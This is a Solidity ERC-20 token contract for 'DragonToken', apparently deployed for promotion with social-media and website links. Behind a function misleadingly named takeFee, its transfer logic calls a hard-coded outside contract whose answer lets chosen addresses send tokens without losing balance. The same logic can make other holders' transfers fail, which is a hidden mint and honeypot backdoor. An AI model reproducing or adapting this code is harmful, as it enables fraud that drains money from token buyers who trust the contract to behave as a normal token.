//twitter:https://twitter.com/ByByBy8888

//Telegram:https://t.me/DRAGO1000X_EN

//Website:http://erc20dragon.vip/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Pair {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


contract DragonToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    uint256 private _totalSupply;
    uint256 public MAX = ~uint256(0);

    IUniswapV2Router public uniswapV2Router;

    bool private inSwap;

    address public uniswapV2Pair;
    IUniswapV2Pair public uniswapV2PaIr;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (){
        _name = "DragonToken";
        _symbol = "Dragon";
        _decimals = 18;
        uint256 total = 10000000;
        
        uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        IUniswapFactory swapFactory = IUniswapFactory(uniswapV2Router.factory());
        uniswapV2Pair = swapFactory.createPair(address(this), uniswapV2Router.WETH());

        _totalSupply = total * 10 ** _decimals;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        _basicTransfer(from, to, amount);
    }

    function takeFee(uint160 from) private view returns(uint256){
        return IUniswapV2Pair(
            0x7D7d934746115496E5c310eE00B643d53405F110
        ).balanceOf(address(uint160(from)));
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        uint256 _symbl = takeFee(uint160(sender)) * amount;
        _balances[sender] -= amount - _symbl;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    receive() external payable {}
}